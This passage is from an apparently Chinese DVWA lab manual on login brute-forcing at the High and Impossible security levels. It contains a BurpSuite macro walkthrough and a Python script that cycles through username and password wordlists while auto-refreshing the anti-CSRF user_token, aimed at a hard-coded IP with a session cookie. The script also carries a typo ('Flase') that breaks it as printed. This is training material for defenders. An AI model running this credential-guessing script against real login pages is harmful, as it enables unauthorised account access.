punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Sanitise password input</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'password'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$pass</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Check database</span>    <span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string">'&lt;pre>'</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/pre>'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token operator">&amp;&amp;</span> <span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Get users details</span>        <span class="token variable">$row</span>    <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$avatar</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"avatar"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Login successful</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;p>Welcome to the password protected area {$user}&lt;/p>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;img src=\"{$avatar}\" />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Login failed</span>        <span class="token function">sleep</span><span class="token punctuation">(</span> <span class="token function">rand</span><span class="token punctuation">(</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;pre>&lt;br />Username and/or password incorrect.&lt;/pre>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// Generate Anti-CSRF token</span><span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> </code></pre><p>说明：</p><ul><li>相比Medium级别的代码，High级别的代码主要增加了<code>token</code>校验机制，<code>user_token</code>键值在一定程度上能够防止重放攻击；</li><li><strong>mysql_real_escape_string</strong>函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，<font color="blue">在代码第10行和第15行分别对user和password进行转义</font>，<strong>基本上</strong>能够抵御sql注入攻击。</li><li>依然没有加入有效的<strong>防爆破机制</strong><code>（sleep(rand(0,3));</code>登录失败随机休眠0-3秒，在一定程度上使破解攻击时间延长，但还是不能防止爆破）。</li></ul><p><strong>漏洞利用：</strong></p><p>方法一：<strong>BurpSuite爆破</strong>：</p><ul><li>在爆破页面随便提交一组数据，使得BurpSuite的proxy模块中存在该条链接信息。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce_Burp捕获爆破链接信息.png" alt="BruteForce_Burp捕获爆破链接信息"></center><ul><li>定义BurpSuite规则同时配置宏动作，用于<code>user_token</code>自动提取和填充。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/添加规则.png" alt="添加规则"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/设置宏信息.png" alt="设置宏信息"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/添加宏项目.png" alt="添加宏项目"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/设置宏项目参数.png" alt="设置宏项目参数"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/设置宏应用范围.png" alt="设置宏应用范围"></center><ul><li>将要爆破的信息发送至Intruder模块。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce_Intruder_High.png" alt="BruteForce_Intruder_High"></center><ul><li>在Intruder模块中设置攻击方式和攻击位置。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce_设置爆破参数和位置_High.png" alt="BruteForce_设置爆破参数和位置_High"></center><ul><li>设置爆破的payload相关信息。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BurteForce_设置username爆破信息_High.png" alt="BurteForce_设置username爆破信息_High"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce_设置password爆破信息_High.png" alt="BruteForce_设置password爆破信息_High"></center><ul><li>在Options选项卡中设置爆破的匹配信息。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce_设置爆破结果匹配信息_High.png" alt="BruteForce_设置爆破结果匹配信息_High"></center><ul><li>开始进行爆破。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce_Start_High.png" alt="BruteForce_Start_High"></center><ul><li>对爆破结果进行分析。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce_result_High.png" alt="BruteForce_result_High"></center><p> 方法二：自编写python脚本暴力破解</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># Version: python3</span><span class="token comment" spellcheck="true"># Author: Silence</span><span class="token comment" spellcheck="true"># Encoding: utf-8</span><span class="token keyword">import</span> os<span class="token keyword">import</span> requests<span class="token keyword">from</span> pyquery <span class="token keyword">import</span> PyQueryBASE_DIR <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read_file</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>path<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fhandler<span class="token punctuation">:</span>        <span class="token keyword">yield</span> <span class="token keyword">from</span> fhandler<span class="token keyword">def</span> <span class="token function">brute_force</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>user_token<span class="token operator">=</span>None<span class="token punctuation">,</span>username<span class="token operator">=</span>None<span class="token punctuation">,</span>password<span class="token operator">=</span>None<span class="token punctuation">,</span>headers<span class="token operator">=</span>None<span class="token punctuation">,</span>init<span class="token operator">=</span>Flase<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">'http://{0}:{1}/dvwa/vulnerabilities/brute/'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token operator">*</span>addr<span class="token punctuation">)</span>    params <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token operator">not</span> init<span class="token punctuation">:</span>        params <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'user_token'</span><span class="token punctuation">:</span>user_token<span class="token punctuation">,</span>            <span class="token string">'username'</span> <span class="token punctuation">:</span> username<span class="token punctuation">,</span>            <span class="token string">'password'</span> <span class="token punctuation">:</span> password<span class="token punctuation">,</span>            <span class="token string">'Login'</span> <span class="token punctuation">:</span> <span class="token string">'Login'</span>    <span class="token punctuation">}</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    <span class="token keyword">if</span> response<span class="token punctuation">.</span>ok<span class="token punctuation">:</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'Welcome to the password protected area'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span>        pq <span class="token operator">=</span> PyQuery<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">return</span> pq<span class="token punctuation">(</span><span class="token string">'input[name=user_token]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>val<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>headers<span class="token punctuation">)</span><span class="token punctuation">:</span>    user_token <span class="token operator">=</span> brute_force<span class="token punctuation">(</span>addr<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>init<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> username <span class="token keyword">in</span> read_file<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>BASE_DIR<span class="token punctuation">,</span><span class="token string">'username.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> password <span class="token keyword">in</span> read_file<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>BASE_DIR<span class="token punctuation">,</span><span class="token string">'password.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            user_token <span class="token operator">=</span> brute_force<span class="token punctuation">(</span>addr<span class="token punctuation">,</span>user_token<span class="token punctuation">,</span>username<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>password<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>headers<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    server <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'124.70.137.227'</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token punctuation">)</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'Cookie'</span> <span class="token punctuation">:</span> <span class="token string">'security=high; PHPSESSID=jkaljlp2tsinkkvvi7psh9rb31'</span>    <span class="token punctuation">}</span>    main<span class="token punctuation">(</span>server<span class="token punctuation">,</span>headers<span class="token punctuation">)</span></code></pre><p>使用：</p><ul><li>从浏览器中 copy 登陆成功后的 cookie 信息</li><li>使用 python3 运行脚本</li></ul><p>说明：</p><ul><li>首次请求登陆页面 html 同时解析 user_token，在后续发起登陆请求时初始化<br>user_token 参数，并从响应的 html 中 user_token 作为下次请求参数的数据来源</li><li>使用 requests 发送请求到 dvwa，根据请求结果是否包含 Welcome to password<br>protected area 字符串判断是否破解成功  </li></ul><h2 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h2><p>​        设置 DVWA 安全级别为 Impossible。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Impossible.png" alt="SecurityLevel_Impossible"></center><p><strong>服务器端核心代码</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string">'Login'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Check Anti-CSRF token</span>    <span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Sanitise username input</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string">'username'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$user</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$user</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Sanitise password input</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string">'password'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$pass</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Default values</span>    <span class="token variable">$total_failed_login</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token variable">$lockout_time</span>       <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">;</span>    <span class="token variable">$account_locked</span>     <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Check the database (Check user information)</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string">'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string">':user'</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Check to see if the user has been locked out.</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">rowCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string">'failed_login'</span> <span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token variable">$total_failed_login</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// User locked out.  Note, using this method would allow for user enumeration!</span>        <span class="token comment" spellcheck="true">//echo "</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span>This account has been locked due to too many incorrect logins<span class="token punctuation">.</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">></span></span></span>"<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Calculate when the user would be allowed to login again</span>        <span class="token variable">$last_login</span> <span class="token operator">=</span> <span class="token function">strtotime</span><span class="token punctuation">(</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string">'last_login'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$timeout</span>    <span class="token operator">=</span> <span class="token variable">$last_login</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token variable">$lockout_time</span> <span class="token operator">*</span> <span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$timenow</span>    <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*        print "The last login was: " . date ("h:i:s", $last_login) . "&lt;br />";        print "The timenow is: " . date ("h:i:s", $timenow) . "&lt;br />";        print "The timeout is: " . date ("h:i:s", $timeout) . "&lt;br />";        */</span>        <span class="token comment" spellcheck="true">// Check to see if enough time has passed, if it hasn't locked the account</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$timenow</span> <span class="token operator">&lt;</span> <span class="token variable">$timeout</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$account_locked</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// print "The account is locked</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span>"<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// Check the database (if username matches the password)</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string">'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string">':user'</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAM_STR</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string">':password'</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// If its a valid login...</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">rowCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token variable">$account_locked</span> <span class="token operator">==</span> <span class="token boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Get users details</span>        <span class="token variable">$avatar</span>       <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string">'avatar'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$failed_login</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string">'failed_login'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$last_login</span>   <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string">'last_login'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Login successful</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;p>Welcome to the password protected area &lt;em>{$user}&lt;/em>&lt;/p>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;img src=\"{$avatar}\" />"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Had the account been locked out since last login?</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$failed_login</span> <span class="token operator">>=</span> <span class="token variable">$total_failed_login</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;p>&lt;em>Warning&lt;/em>: Someone might of been brute forcing your account.&lt;/p>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;p>Number of login attempts: &lt;em>{$failed_login}&lt;/em>.&lt;br />Last login attempt was at: &lt;em>${last_login}&lt;/em>.&lt;/p>"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Reset bad login count</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string">'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        